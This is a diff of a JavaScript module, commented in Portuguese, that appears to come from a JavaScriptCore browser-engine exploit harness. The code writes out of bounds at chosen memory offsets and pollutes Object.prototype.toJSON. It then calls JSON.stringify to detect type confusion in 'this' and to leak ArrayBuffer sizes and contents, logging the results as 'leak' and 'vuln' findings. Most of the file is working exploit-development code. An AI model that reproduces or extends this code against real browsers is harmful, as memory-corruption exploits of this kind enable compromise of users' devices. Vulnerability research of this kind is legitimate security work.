@@ -7,94 +7,67 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// Contador global, embora a toJSON não deva usá-lo para evitar TypeError.
-export let current_toJSON_call_count_for_TypeError_test = 0;
+// Contador global, usado apenas pela função de execução para log externo.
+export let current_toJSON_call_count_for_TypeError_test = 0; 
+let victim_ab_ref_for_tc_test = null; // Referência global para o victim_ab
 
-// Nova toJSON para sondar um DataView
-function toJSON_ProbeDataViewVictim() {
-    // Evitar operações que causaram TypeError anteriormente (contador global, logS3 direto, document.title)
+// toJSON "segura" para inspecionar 'this' e tentar detectar Type Confusion
+function toJSON_InspectThisForTC() {
+    current_toJSON_call_count_for_TypeError_test++; // Incrementa para rastrear chamadas
+    const FNAME_toJSON_local = `toJSON_InspectThisForTC(Call ${current_toJSON_call_count_for_TypeError_test})`;
     
-    let results = {
-        toJSON_executed: "toJSON_ProbeDataViewVictim",
-        this_type: "N/A",
-        is_dataview: false,
-        dv_buffer_accessible: false,
-        dv_buffer_byteLength: "N/A",
-        dv_byteLength: "N/A",
-        dv_byteOffset: "N/A",
-        dv_read_val_at_0: "N/A",
-        dv_read_error: null,
-        new_dv_from_buffer_read_val: "N/A",
-        new_dv_from_buffer_error: null,
-        error_in_toJSON: null
+    // Usar console.log para debug MUITO inicial dentro da toJSON, pois debug_log/logS3 podem ser o problema.
+    // console.log(`[CONSOLE_toJSON] ${FNAME_toJSON_local} INVOCADA. this type: ${Object.prototype.toString.call(this)}`);
+    // document.title pode causar TypeError, então vamos evitar aqui por enquanto.
+
+    let inspection_results = {
+        toJSON_executed: "toJSON_InspectThisForTC",
+        call_number: current_toJSON_call_count_for_TypeError_test,
+        this_actual_type: Object.prototype.toString.call(this),
+        this_constructor_name: this?.constructor?.name || "N/A",
+        is_victim_ab_ref: (victim_ab_ref_for_tc_test && this === victim_ab_ref_for_tc_test) ? "SIM" : "NÃO",
+        is_instanceof_ArrayBuffer: (this instanceof ArrayBuffer) ? "SIM" : "NÃO",
+        observed_byteLength: "N/A",
+        dataView_read_at_0: "N/A (não tentado ou não aplicável)",
+        error_during_inspection: null
     };
 
     try {
-        results.this_type = Object.prototype.toString.call(this);
-
-        if (this instanceof DataView) {
-            results.is_dataview = true;
-            
-            // Sondar propriedades do DataView
-            try {
-                results.dv_byteLength = this.byteLength;
-                results.dv_byteOffset = this.byteOffset;
-                if (this.buffer instanceof ArrayBuffer) {
-                    results.dv_buffer_accessible = true;
-                    results.dv_buffer_byteLength = this.buffer.byteLength;
-                }
-            } catch (e_prop) {
-                results.error_in_toJSON = `Error accessing DataView props: ${e_prop.name} - ${e_prop.message}`;
-            }
-
-            // Tentar ler diretamente do DataView (this)
-            if (results.is_dataview && this.byteLength >= 4) {
+        if (this instanceof ArrayBuffer) {
+            inspection_results.observed_byteLength = this.byteLength;
+            if (this.byteLength >= 4) {
                 try {
-                    results.dv_read_val_at_0 = this.getUint32(0, true);
-                } catch (e_dv_read) {
-                    results.dv_read_error = `Error this.getUint32: ${e_dv_read.name} - ${e_dv_read.message}`;
+                    let dv = new DataView(this, 0, 4);
+                    inspection_results.dataView_read_at_0 = toHex(dv.getUint32(0, true));
+                } catch (e_dv) {
+                    inspection_results.dataView_read_at_0 = `Erro DataView: ${e_dv.name}`;
                 }
-            } else if (results.is_dataview) {
-                 results.dv_read_error = "DataView too small for getUint32(0)";
+            } else {
+                inspection_results.dataView_read_at_0 = "Buffer muito pequeno para DWORD";
             }
-            
-            // Tentar criar nova DataView a partir do this.buffer e ler
-            if (results.dv_buffer_accessible && this.buffer.byteLength >= 4) {
-                try {
-                    let new_dv = new DataView(this.buffer, 0, 4);
-                    results.new_dv_from_buffer_read_val = new_dv.getUint32(0, true);
-                } catch (e_new_dv) {
-                    results.new_dv_from_buffer_error = `Error new DataView(this.buffer): ${e_new_dv.name} - ${e_new_dv.message}`;
-                }
-            } else if (results.dv_buffer_accessible) {
-                 results.new_dv_from_buffer_error = "this.buffer too small for getUint32(0)";
-            }
-
-        } else {
-            results.error_in_toJSON = "this is not a DataView instance";
         }
-    } catch (e_outer) {
-        results.error_in_toJSON = results.error_in_toJSON || `Outer Exception in toJSON: ${e_outer.name}: ${e_outer.message}`;
+    } catch (e_inspect) {
+        inspection_results.error_during_inspection = `${e_inspect.name}: ${e_inspect.message}`;
     }
     
-    return results;
+    // É crucial retornar um objeto simples para evitar recursão infinita ou TypeErrors pelo valor de retorno.
+    return inspection_results; 
 }
 
-
-export async function executeFocusedTestForDataViewVictim( // Nome da função atualizado
+export async function executeAttemptThisConfusionWithValue(
     testDescription,
-    // toJSONFunctionToUse será hardcoded para toJSON_ProbeDataViewVictim
-    valueToWriteOOB,
-    corruptionOffsetToTest
+    valueToWriteOOB,     // O valor OOB a ser escrito
+    corruptionOffsetToTest // O offset da corrupção
 ) {
-    const FNAME = `executeFocusedTestForDataViewVictim<${testDescription}>`;
-    logS3(`--- Iniciando Teste Focado (DataView Victim): ${testDescription} ---`, "test", FNAME);
+    const FNAME = `executeAttemptThisConfusion<${testDescription}>`;
+    logS3(`--- Iniciando Teste de Type Confusion (this): ${testDescription} ---`, "test", FNAME);
     logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)}`, "info", FNAME);
-    document.title = `Iniciando DV Victim: ${testDescription}`;
+    document.title = `Iniciando TC_this: ${testDescription}`;
 
-    current_toJSON_call_count_for_TypeError_test = 0; 
+    current_toJSON_call_count_for_TypeError_test = 0;
+    victim_ab_ref_for_tc_test = null; // Limpa a referência global
 
-    const underlying_ab_size_val = 64;
+    const victim_ab_size_val = 64;
     const bytes_to_write_val = 4;
     const ppKey_val = 'toJSON';
 
@@ -106,9 +79,12 @@ export async function executeFocusedTestForDataViewVictim( // Nome da função a
     }
     document.title = "OOB OK - " + FNAME;
 
-    let underlying_ab = new ArrayBuffer(underlying_ab_size_val);
-    let dataView_victim = new DataView(underlying_ab); // A VÍTIMA AGORA É UM DATAVIEW
-    logS3(`DataView vítima (sobre AB de ${underlying_ab_size_val} bytes) recriado.`, "info", FNAME);
+    victim_ab_ref_for_tc_test = new ArrayBuffer(victim_ab_size_val); // Define a referência global
+    logS3(`ArrayBuffer de referência (victim_ab_ref_for_tc_test, ${victim_ab_size_val}b) criado.`, "info", FNAME);
+    
+    let simple_obj_to_stringify = { message: "Eu sou um objeto simples sendo stringificado." };
+    logS3(`Objeto a ser stringificado: ${JSON.stringify(simple_obj_to_stringify)}`, "info", FNAME);
+
 
     let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
     let pollutionApplied = false;
@@ -119,70 +95,99 @@ export async function executeFocusedTestForDataViewVictim( // Nome da função a
 
     try {
         stepReached = "aplicando_pp";
-        logS3(`Poluindo Object.prototype.${ppKey_val} com toJSON_ProbeDataViewVictim...`, "info", FNAME);
-        document.title = `Aplicando PP (${testDescription})`;
+        logS3(`Poluindo Object.prototype.${ppKey_val} com toJSON_InspectThisForTC...`, "info", FNAME);
+        document.title = `Aplicando PP TC (${testDescription})`;
         Object.defineProperty(Object.prototype, ppKey_val, {
-            value: toJSON_ProbeDataViewVictim, // Usando a toJSON específica para DataView
+            value: toJSON_InspectThisForTC,
             writable: true, configurable: true, enumerable: false
         });
         pollutionApplied = true;
-        logS3(`PP aplicada com toJSON_ProbeDataViewVictim.`, "good", FNAME);
+        logS3(`PP aplicada com toJSON_InspectThisForTC.`, "good", FNAME);
         stepReached = "pp_aplicada";
-        document.title = `PP OK (${testDescription})`;
+        document.title = `PP TC OK (${testDescription})`;
 
         stepReached = "antes_escrita_oob";
         logS3(`CORRUPÇÃO: ${toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)}`, "warn", FNAME);
-        document.title = `Antes OOB Write (${toHex(corruptionOffsetToTest)})`;
+        document.title = `Antes OOB Write TC (${toHex(corruptionOffsetToTest)})`;
         oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytes_to_write_val);
         logS3("Escrita OOB feita.", "info", FNAME);
         stepReached = "apos_escrita_oob";
-        document.title = `Após OOB Write (${toHex(corruptionOffsetToTest)})`;
+        document.title = `Após OOB Write TC (${toHex(corruptionOffsetToTest)})`;
 
         await PAUSE_S3(SHORT_PAUSE_S3);
 
-        stepReached = "antes_stringify";
-        document.title = `Antes Stringify DV (${toHex(corruptionOffsetToTest)})`;
-        logS3(`Chamando JSON.stringify(dataView_victim) (com ${testDescription})...`, "info", FNAME);
+        stepReached = "antes_stringify_simple_obj";
+        document.title = `Antes Stringify simple_obj (${toHex(corruptionOffsetToTest)})`;
+        logS3(`Chamando JSON.stringify(simple_obj_to_stringify)... (Esperando que toJSON_InspectThisForTC seja chamada)`, "info", FNAME);
         
         try {
-            stringifyResult = JSON.stringify(dataView_victim); // STRINGIFICANDO O DATAVIEW
-            stepReached = `apos_stringify`;
+            // A VÍTIMA DO STRINGIFY É O OBJETO SIMPLES
+            stringifyResult = JSON.stringify(simple_obj_to_stringify); 
+            stepReached = `apos_stringify_simple_obj`;
             potentiallyCrashed = false; 
-            document.title = `Strfy DV OK (${testDescription})`;
-            logS3(`Resultado JSON.stringify: ${String(stringifyResult)}`, "info", FNAME); // Log completo
+            document.title = `Strfy simple_obj OK (${testDescription})`;
+            // Logar o resultado completo, pois ele contém os dados da inspeção do 'this'
+            logS3(`Resultado JSON.stringify(simple_obj): ${JSON.stringify(stringifyResult)}`, "leak", FNAME); 
+            logS3(`   (Chamadas totais à toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "info", FNAME);
         } catch (e) {
-            stepReached = `erro_stringify`;
+            stepReached = `erro_stringify_simple_obj`;
             potentiallyCrashed = false; 
             errorCaptured = e;
-            document.title = `ERRO Strfy DV (${e.name}) - ${testDescription}`;
-            logS3(`ERRO CAPTURADO JSON.stringify(dataView_victim): ${e.name} - ${e.message}.`, "critical", FNAME);
+            document.title = `ERRO Strfy simple_obj (${e.name}) - ${testDescription}`;
+            logS3(`ERRO CAPTURADO JSON.stringify(simple_obj): ${e.name} - ${e.message}. (Chamadas: ${current_toJSON_call_count_for_TypeError_test})`, "critical", FNAME);
             if (e.stack) logS3(`   Stack: ${e.stack}`, "error");
-            console.error(`JSON.stringify ERROR (DataView Victim - ${testDescription}):`, e);
+            console.error(`JSON.stringify ERROR (simple_obj - ${testDescription}):`, e);
         }
     } catch (mainError) {
         potentiallyCrashed = false;
         errorCaptured = mainError;
         logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
-        document.title = "ERRO Principal DV - " + FNAME;
+        document.title = "ERRO Principal TC - " + FNAME;
         if (mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error");
-        console.error("Main test error (DataView Victim):", mainError);
+        console.error("Main test error (TC this):", mainError);
     } finally {
         if (pollutionApplied) {
             if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
             else delete Object.prototype[ppKey_val];
         }
+        victim_ab_ref_for_tc_test = null; // Limpa referência
         clearOOBEnvironment();
-        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}.`, "info", FNAME);
+        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}.`, "info", FNAME);
         if (potentiallyCrashed) {
-             document.title = `CONGELOU DV? ${stepReached} - ${FNAME}`;
-             logS3(`O TESTE PODE TER CONGELADO/CRASHADO (DataView Victim) em ${stepReached}.`, "error", FNAME);
+             document.title = `CONGELOU TC? ${stepReached} - ${FNAME}`;
+             logS3(`O TESTE PODE TER CONGELADO/CRASHADO (TC this) em ${stepReached}. Chamadas: ${current_toJSON_call_count_for_TypeError_test}`, "error", FNAME);
         }
     }
-    logS3(`--- Teste Focado (DataView Victim) Concluído: ${testDescription} ---`, "test", FNAME);
-    if (!potentiallyCrashed && !errorCaptured) {
-        document.title = `Teste DV Concluído OK - ${testDescription}`;
-    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy DV")) { 
-        document.title = `ERRO OCORREU DV (${errorCaptured.name}) - ${testDescription}`;
+    logS3(`--- Teste de Type Confusion (this) Concluído: ${testDescription} (Chamadas: ${current_toJSON_call_count_for_TypeError_test}) ---`, "test", FNAME);
+    
+    // Analisar o resultado da stringificação para checar a Type Confusion
+    let tcDetected = false;
+    if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_InspectThisForTC") {
+        logS3("   Análise do resultado da toJSON_InspectThisForTC:", "info", FNAME);
+        logS3(`     this_actual_type: ${stringifyResult.this_actual_type}`, "info", FNAME);
+        logS3(`     is_victim_ab_ref: ${stringifyResult.is_victim_ab_ref}`, stringifyResult.is_victim_ab_ref === "SIM" ? "vuln" : "info", FNAME);
+        logS3(`     is_instanceof_ArrayBuffer: ${stringifyResult.is_instanceof_ArrayBuffer}`, "info", FNAME);
+        logS3(`     observed_byteLength: ${stringifyResult.observed_byteLength}`, "leak", FNAME);
+        logS3(`     dataView_read_at_0: ${stringifyResult.dataView_read_at_0}`, "leak", FNAME);
+        if (stringifyResult.error_during_inspection) {
+            logS3(`     ERROR_IN_toJSON: ${stringifyResult.error_during_inspection}`, "error", FNAME);
+        }
+        if (stringifyResult.is_victim_ab_ref === "SIM" || (stringifyResult.is_instanceof_ArrayBuffer === "SIM" && stringifyResult.this_actual_type === "[object ArrayBuffer]" && stringifyResult.this_constructor_name === "ArrayBuffer")) {
+            tcDetected = true;
+            logS3("     !!!! TYPE CONFUSION POTENCIALMENTE DETECTADA !!!! 'this' na toJSON parece ser o victim_ab_ref_for_tc_test!", "critical", FNAME);
+            document.title = `TC DETECTADA! - ${testDescription}`;
+            if (typeof stringifyResult.observed_byteLength === 'number' && stringifyResult.observed_byteLength !== victim_ab_size_val) {
+                logS3(`     !!!! TAMANHO ANÔMALO DO VICTIM_AB (this): ${stringifyResult.observed_byteLength} (esperado ${victim_ab_size_val}) !!!!`, "critical", FNAME);
+                document.title = `TC + SIZE CORRUPT! ${stringifyResult.observed_byteLength} - ${testDescription}`;
+            }
+        }
     }
-    return { errorOccurred: errorCaptured, calls: 1, /* Assumindo 1 chamada à toJSON */ potentiallyCrashed, stringifyResult };
+
+    if (!potentiallyCrashed && !errorCaptured && !document.title.startsWith("TC DETECTADA") && !document.title.startsWith("TC + SIZE")) {
+        document.title = `Teste TC_this OK (${tcDetected ? "TC!" : "No TC"}) - ${testDescription}`;
+    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
+        document.title = `ERRO OCORREU TC (${errorCaptured.name}) - ${testDescription}`;
+    }
+    
+    return { errorOccurred: errorCaptured, calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed, stringifyResult, tcDetected };
 }
